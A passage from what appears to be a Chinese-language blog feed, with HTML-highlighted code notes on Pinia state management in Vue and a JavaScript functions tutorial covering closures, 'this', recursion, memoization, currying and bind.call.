class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// Counter.vue</span><br><span class="line">import &#123; useCounterStore &#125; <span class="keyword">from</span> &#x27;path/<span class="keyword">to</span>/src/stores/counterStore&#x27;</span><br><span class="line"></span><br><span class="line">export <span class="keyword">default</span> &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    <span class="keyword">const</span> counterStore = useCounterStore()</span><br><span class="line">    // TODO 默认情况下可以直接这么更改，但是不推荐 // https://pinia.vuejs.org/core-concepts/<span class="keyword">state</span>.html<span class="comment">#accessing-the-state</span></span><br><span class="line">    counterStore.j ++</span><br><span class="line">    </span><br><span class="line">    // 这里在视图里使用 counterStore.j 和 counterStore.k</span><br><span class="line">    // 但你不能解构 counterStore，只能像下面这样解构：</span><br><span class="line">    <span class="keyword">const</span> &#123; j, k &#125; = storeToRefs(counterStore) // 注意：这里会自动忽略 方法 和 非响应式数据(Creates an object of references with <span class="literal">all</span> the <span class="keyword">state</span>, getters, and plugin-added <span class="keyword">state</span> properties of the store. Similar <span class="keyword">to</span> <span class="keyword">to</span>Refs() but specifically designed <span class="keyword">for</span> Pinia stores so methods and non reactive properties are completely ignored.)</span><br><span class="line">    return &#123;</span><br><span class="line">      counterStore, j, k,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Store-Getters"><a href="#Store-Getters" class="headerlink" title="Store Getters"></a>Store Getters</h5><p>getters 其实就是 store 的计算属性集合，而且 getter 不能是异步函数</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">export <span class="keyword">const</span> useStore = defineStore(&#x27;main&#x27;, &#123;</span><br><span class="line">  <span class="keyword">state</span>: () =&gt; (&#123;</span><br><span class="line">    counter: <span class="number">0</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">  getters: &#123;</span><br><span class="line">    doubleCount(<span class="keyword">state</span>) &#123;</span><br><span class="line">      return <span class="keyword">state</span>.counter * <span class="number">2</span></span><br><span class="line">    &#125;,</span><br><span class="line">    doublePlusOne() &#123;</span><br><span class="line">      return this.doubleCount + <span class="number">1</span> // getter 访问另一个 getter 或者 <span class="keyword">state</span> 可以用 this</span><br><span class="line">    &#125;,</span><br><span class="line">    getUserById: (<span class="keyword">state</span>) =&gt; &#123; // getter 可以返回一个函数，不过这会导致缓存失效</span><br><span class="line">      return (<span class="keyword">user</span>Id) =&gt; <span class="keyword">state</span>.users.find((<span class="keyword">user</span>) =&gt; <span class="keyword">user</span>.id === <span class="keyword">user</span>Id)</span><br><span class="line">    &#125;,</span><br><span class="line">    otherGetter(<span class="keyword">state</span>) &#123; // 你还可以调用其他的 store</span><br><span class="line">      <span class="keyword">const</span> otherStore = useOtherStore()</span><br><span class="line">      return <span class="keyword">state</span>.localData + otherStore.data</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">// store.doubleCount 和 store.doublePlusOne 就可以直接当做属性使用了</span><br><span class="line">// store.getUserById(<span class="keyword">user</span>Id) 可以当做函数使用</span><br></pre></td></tr></table></figure><h5 id="Store-Actions"><a href="#Store-Actions" class="headerlink" title="Store Actions"></a>Store Actions</h5><p>action 其实就是 store 的 methods，而且可以是异步函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useUserStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;users&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">state</span>: <span class="function">() =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">userData</span>: <span class="literal">null</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">getUser</span>(<span class="params">token</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">userData</span> = <span class="keyword">await</span> api.<span class="title function_">post</span>(&#123; token &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 然后你就可以使用 userStore.getUser(token) 了</span></span><br></pre></td></tr></table></figure><h3 id="写法二："><a href="#写法二：" class="headerlink" title="写法二："></a>写法二：</h3><p>推荐这种，符合Vue3 setup的编程模式，让结构更加扁平化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref, computed &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useUserStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;users&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> userData= <span class="title function_">ref</span>(&#123;&#125;);</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">getUser</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    userData.<span class="property">value</span> = <span class="keyword">await</span> api.<span class="title function_">post</span>(&#123; token &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> userName = <span class="title function_">computed</span>(<span class="function">() =&gt;</span> userData.<span class="property">value</span>.<span class="property">name</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123; userData, userName, getUser &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="store-patch-object-fn"><a href="#store-patch-object-fn" class="headerlink" title="store.$patch(object | fn)"></a>store.$patch(object | fn)</h2><p>批量更新</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">counterStore.<span class="variable">$patch</span>(</span><br><span class="line">   &#123; name: &#x27;pinia&#x27;, age: counterStore.age + <span class="number">1</span> &#125; </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">cartStore.<span class="variable">$patch</span>((<span class="keyword">state</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">state</span>.items.push(&#123; name: &#x27;vuex&#x27;, age: <span class="number">18</span> &#125;)</span><br><span class="line">  <span class="keyword">state</span>.hasChanged = true</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="store-subscribe-fn"><a href="#store-subscribe-fn" class="headerlink" title="store.$subscribe(fn)"></a>store.$subscribe(fn)</h2><p>用于监听 state 的整体变化。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cartStore.<span class="variable">$subscribe</span>((mutation, state) =&gt; &#123;</span><br><span class="line">  <span class="regexp">//</span> import &#123; MutationType &#125; from <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line">  mutation.type <span class="regexp">//</span> <span class="string">&#x27;direct&#x27;</span> | <span class="string">&#x27;patch object&#x27;</span> | <span class="string">&#x27;patch function&#x27;</span></span><br><span class="line">  mutation.storeId  </span><br><span class="line">  mutation.payload <span class="regexp">//</span> 获取 <span class="variable">$patch</span> 接收到的参数</span><br><span class="line"></span><br><span class="line">  localStorage.setItem(<span class="string">&#x27;cart&#x27;</span>, JSON.stringify(state))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>它有一个很方便的特性是会自动在组件卸载时注销，如果你不想要，可以在 $subscribe 第二个参数处传入 <code>&#123;detached: true&#125;</code> 选项。</p></blockquote><p>你也可以使用 watch 达到类似的效果：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">watch(</span><br><span class="line">  pinia.<span class="keyword">state</span>,</span><br><span class="line">  (<span class="keyword">state</span>) =&gt; &#123;</span><br><span class="line">    localStorage.<span class="built_in">set</span>Item(&#x27;piniaState&#x27;, JSON.stringify(<span class="keyword">state</span>))</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; deep: true &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="store-onAction"><a href="#store-onAction" class="headerlink" title="store.$onAction()"></a>store.$onAction()</h2><p>用于监控所有 action 的执行情况。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">const unsubscribe = someStore.<span class="symbol">$o</span>nAction(</span><br><span class="line">  (&#123;</span><br><span class="line">    name, <span class="comment">// action 的名字</span></span><br><span class="line">    store, <span class="comment">// store === someStore</span></span><br><span class="line">    args, <span class="comment">// action 的实际参数</span></span><br><span class="line">    after, <span class="comment">// action 成功之后执行 after</span></span><br><span class="line">    onError, <span class="comment">// action 失败之后执行 onError</span></span><br><span class="line">  &#125;) =&gt; &#123;</span><br><span class="line">    const startTime = <span class="built_in">Date</span>.<span class="built_in">now</span>()</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">`开始执行 &quot;<span class="subst">$&#123;name&#125;</span>&quot; 参数为 [<span class="subst">$&#123;args.join(<span class="string">&#x27;, &#x27;</span>)&#125;</span>].`</span>)</span><br><span class="line">    after(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.<span class="built_in">log</span>(</span><br><span class="line">        <span class="string">`执行成功 &quot;<span class="subst">$&#123;name&#125;</span>&quot; 用时 <span class="subst">$&#123;<span class="built_in">Date</span>.<span class="built_in">now</span>() - startTime&#125;</span>毫秒\n结果为：<span class="subst">$&#123;result&#125;</span>`</span></span><br><span class="line">      )</span><br><span class="line">    &#125;)</span><br><span class="line">    onError(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.warn(</span><br><span class="line">        <span class="string">`执行失败 &quot;<span class="subst">$&#123;name&#125;</span>&quot; 用时 <span class="subst">$&#123;<span class="built_in">Date</span>.<span class="built_in">now</span>() - startTime&#125;</span>毫秒\n报错为：<span class="subst">$&#123;error&#125;</span>.`</span></span><br><span class="line">      )</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"><span class="comment">// $onAction 会在它所在组件卸载时自动销毁</span></span><br><span class="line"><span class="comment">// 如果你将 $onAction 的第二个参数设置为 true，那么你需要自己调用 unsubscribe 来取消监听。</span></span><br></pre></td></tr></table></figure><h2 id="store-reset"><a href="#store-reset" class="headerlink" title="store.$reset()"></a>store.$reset()</h2><p>你可以使用 counterStore.$reset() 重置 state</p><h2 id="store-state"><a href="#store-state" class="headerlink" title="store.$state"></a>store.$state</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 下面两句代码都能覆盖原有 <span class="keyword">state</span></span><br><span class="line">store.<span class="variable">$state</span> = &#123; counter: <span class="number">666</span>, name: &#x27;Paimon&#x27; &#125;</span><br><span class="line">pinia.<span class="keyword">state</span>.value = &#123;&#125; // 这句常用在 SSR</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>函数全解</title>
      <link href="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/"/>
      <url>/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/</url>
      
        <content type="html"><![CDATA[<h1 id="1-函数的返回值由什么确定？"><a href="#1-函数的返回值由什么确定？" class="headerlink" title="1. 函数的返回值由什么确定？"></a>1. 函数的返回值由什么确定？</h1><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img.png"></p><h3 id="答：’x1’"><a href="#答：’x1’" class="headerlink" title="答：’x1’"></a>答：’x1’</h3><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_1.png"></p><blockquote><p>当初在JS故意这么设计的，如果a像参数x一样也是在调用的时候确认的话，那和干脆把a也直接传入不就好了，所以a由定义时的环境决定。</p></blockquote><p>同理：下图结果为’x2’</p><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_2.png"></p><h1 id="2-闭包"><a href="#2-闭包" class="headerlink" title="2. 闭包"></a>2. 闭包</h1><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_3.png"></p><blockquote><p>对象也可以模拟闭包</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> self = &#123;</span><br><span class="line">  <span class="attr">_a</span>: <span class="number">1</span>, <span class="comment">// js可以设置为私有属性</span></span><br><span class="line">  <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">a</span>++</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>函数可以模拟对象</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">age, name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (key === <span class="string">&#x27;age&#x27;</span>) <span class="keyword">return</span> age;</span><br><span class="line">    <span class="keyword">if</span> (key === <span class="string">&#x27;name&#x27;</span>) <span class="keyword">return</span> name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">obj</span> = <span class="function"><span class="keyword">fn</span>(<span class="params"><span class="string">&#x27;18&#x27;</span>, <span class="string">&#x27;zch&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">obj</span>(<span class="params"><span class="string">&#x27;age&#x27;</span></span>) // 18</span></span><br><span class="line"><span class="function"><span class="title">obj</span>(<span class="params"><span class="string">&#x27;name&#x27;</span></span>) // <span class="title">zch</span></span></span><br></pre></td></tr></table></figure><h1 id="3-this（this是参数，箭头函数中this是环境）"><a href="#3-this（this是参数，箭头函数中this是环境）" class="headerlink" title="3. this（this是参数，箭头函数中this是环境）"></a>3. this（this是参数，箭头函数中this是环境）</h1><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_4.png"></p><p>答button是错的！</p><blockquote><p>完美打法，我现在无法确定this的值是什么（<strong>this只有在调用的时候才能确定</strong>*(因为this是参数)*），如果是用户点击时调用的话，this就是button，如果 <code>var fn = button.onclick; fn()</code> ，此时的this就是window</p></blockquote><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_5.png"></p><p>看到此题时，我们先改写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> length = <span class="number">10</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">length</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">lengh</span>: <span class="number">5</span>,</span><br><span class="line">  <span class="title function_">methods</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">    fn.<span class="title function_">call</span>(<span class="literal">undefined</span>)</span><br><span class="line">    <span class="variable language_">arguments</span>[<span class="number">0</span>].<span class="title function_">call</span>(<span class="variable language_">arguments</span>) <span class="comment">// 把 arguments[0]() 比作 arguments.0()</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.<span class="property">methods</span>.<span class="title function_">call</span>(obj, fn, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><blockquote><p>所以第一次打印出的值是 <code>window.length</code> （窗口中iframe的个数）<br>第二次为 <code>arguments.length</code>（函数实参的个数）</p></blockquote><h3 id="记法"><a href="#记法" class="headerlink" title="记法"></a>记法</h3><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_6.png"></p><h1 id="3-闭包"><a href="#3-闭包" class="headerlink" title="3. 闭包"></a>3. 闭包</h1><blockquote><p>如果在函数里面能访问外面的变量，那么这个函数+这些变量&#x3D;闭包</p></blockquote><blockquote><p>并不是所有语言都有闭包， <code>ruby</code> 就没有， ruby用def声明的函数就不能使用闭包， 使用lambda才可以</p></blockquote><h1 id="4-递归"><a href="#4-递归" class="headerlink" title="4. 递归"></a>4. 递归</h1><p>栗子：阶乘</p><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_7.png"></p><p>调用栈中的图：</p><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_8.png"></p><p>栗子：斐波那契数列（0，1，1，2，3，5………）每一项都是前两项的和</p><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_9.png"></p><blockquote><p>我们发现在计算中会爆栈，因为会重复计算，如下图，会重复计算<br><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_10.png"></p></blockquote><h3 id="解决方法：尾递归优化或者记忆化函数"><a href="#解决方法：尾递归优化或者记忆化函数" class="headerlink" title="解决方法：尾递归优化或者记忆化函数"></a>解决方法：<strong>尾递归优化</strong>或者<strong>记忆化函数</strong></h3><h5 id="尾递归"><a href="#尾递归" class="headerlink" title="- 尾递归"></a>- 尾递归</h5><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_11.png"></p><p>js基本不考虑，语言没有做优化，依旧会记忆很多东西</p><h5 id="记忆化函数"><a href="#记忆化函数" class="headerlink" title="- 记忆化函数"></a>- 记忆化函数</h5><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_12.png"></p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比如说用循环的中的数组来记录斐波那契</span></span><br><span class="line"><span class="keyword">const</span> <span class="function"><span class="keyword">fn</span> = <span class="params">(n)</span> =&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> <span class="keyword">array</span> = [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n<span class="number">-2</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">array</span>[i+<span class="number">2</span>] = <span class="keyword">array</span>[i+<span class="number">1</span>] + <span class="keyword">array</span>[i]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>[<span class="keyword">array</span>.length<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://codesandbox.io/s/suspicious-moon-oxdq4?fontsize=14&hidenavigation=1&theme=dark">react 中的记忆栗子</a></p><h5 id="测试题"><a href="#测试题" class="headerlink" title="测试题"></a>测试题</h5><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试题</span></span><br><span class="line">const memo = <span class="function">(<span class="params">fn</span>) =&gt;</span> &#123;</span><br><span class="line">  请补全</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const x2 = memo(<span class="function">(<span class="params">x</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;执行了一次&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">2</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 第一次调用 x2(1)</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x2(<span class="number">1</span>)) <span class="comment">// 打印出执行了，并且返回2</span></span><br><span class="line">  <span class="comment">// 第二次调用 x2(1)</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x2(<span class="number">1</span>)) <span class="comment">// 不打印执行，并且返回上次的结果2</span></span><br><span class="line">  <span class="comment">// 第三次调用 x2(1)</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x2(<span class="number">1</span>)) <span class="comment">// 不打印执行，并且返回上次的结果2</span></span><br></pre></td></tr></table></figure><p><a href="http://js.jirengu.com/xezic/2/edit?js,console">答案</a></p><h1 id="5-科里化"><a href="#5-科里化" class="headerlink" title="5.科里化"></a>5.科里化</h1><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const <span class="built_in">add</span> = (<span class="keyword">a</span>, b) =&gt; <span class="keyword">a</span> + b</span><br><span class="line"></span><br><span class="line">const <span class="built_in">add</span> = <span class="keyword">a</span> =&gt; b =&gt; <span class="keyword">a</span>+b</span><br></pre></td></tr></table></figure><blockquote><p>分析： <code>const add = a =&gt; b =&gt; a+b</code><br>一、正常理解我们可以拆解为两个部分1. 函数接受一个参数 a。2. 返回一个函数 b &#x3D;&gt; a + b。即：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">const</span> add = a =&gt;</span><br><span class="line">              b =&gt; a +b</span><br></pre></td></tr></table></figure><p>二、如果是函数式的思想来理解，将会拆解成如下两部分1. 接受参数a， 接受参数b。2.返回a+b</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;const add = <span class="selector-tag">a</span> =&gt;</span><br><span class="line">             <span class="selector-tag">b</span> =&gt; </span><br><span class="line">               <span class="selector-tag">a</span> + <span class="selector-tag">b</span> </span><br></pre></td></tr></table></figure></blockquote><p><img src="/Blog/2022/03/12/javascript/%E5%87%BD%E6%95%B0%E5%85%A8%E8%A7%A3/index/img_13.png"></p><h5 id="测试题-1"><a href="#测试题-1" class="headerlink" title="测试题"></a>测试题</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试题</span></span><br><span class="line">const currify =<span class="function"> (<span class="params">fn</span>, <span class="params">params</span> = [])=&gt;</span></span><br><span class="line">  请补全</span><br><span class="line"></span><br><span class="line">addTwo =<span class="function"> (<span class="params">a</span>,<span class="params">b</span>)=&gt;</span>a+b</span><br><span class="line">addThree =<span class="function"> (<span class="params">a</span>,<span class="params">b</span>,<span class="params">c</span>)=&gt;</span>a+b+c</span><br><span class="line"></span><br><span class="line">newAddTwo = currify(addTwo)</span><br><span class="line">newAddThree = currify(addThree)</span><br><span class="line"></span><br><span class="line">console.log(<span class="keyword">new</span><span class="constructor">AddTwo(1)</span>(<span class="number">2</span>)) <span class="comment">// 3</span></span><br><span class="line">console.log(<span class="keyword">new</span><span class="constructor">AddThree(1)</span>(<span class="number">2</span>)(<span class="number">3</span>)) <span class="comment">// 6</span></span><br></pre></td></tr></table></figure><p><a href="http://js.jirengu.com/lajix/1/edit?js,console">答案</a></p><h1 id="6-高阶函数"><a href="#6-高阶函数" class="headerlink" title="6.高阶函数"></a>6.高阶函数</h1><blockquote><p>把函数作为参数或者返回值的函数。</p></blockquote><h4 id="推理-bind-call-是什么意思"><a href="#推理-bind-call-是什么意思" class="headerlink" title="推理 bind.call() 是什么意思"></a>推理 <code>bind.call()</code> 是什么意思</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bind = <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bind</span></span><br><span class="line"><span class="keyword">const</span> fn = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;this&#x27;</span>, <span class="variable language_">this</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;arguments&#x27;</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> newFn = fn.<span class="title function_">bind</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;zch&#x27;</span> &#125;, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">const</span> newFn = fn.<span class="property">bind</span>.<span class="title function_">call</span>(fn, &#123; <span class="attr">name</span>: <span class="string">&#x27;zch&#x27;</span> &#125;, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment">// 参考：上述第三点this中：obj.methods() 等价于 obj.methods.call(obj)</span></span><br><span class="line"><span class="comment">// 即：</span></span><br><span class="line">bind.<span class="title function_">call</span>(fn, &#123; <span class="attr">name</span>: <span class="string">&#x27;zch&#x27;</span> &#125;, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="comment">// fn.bind === Function.prototype.bind // 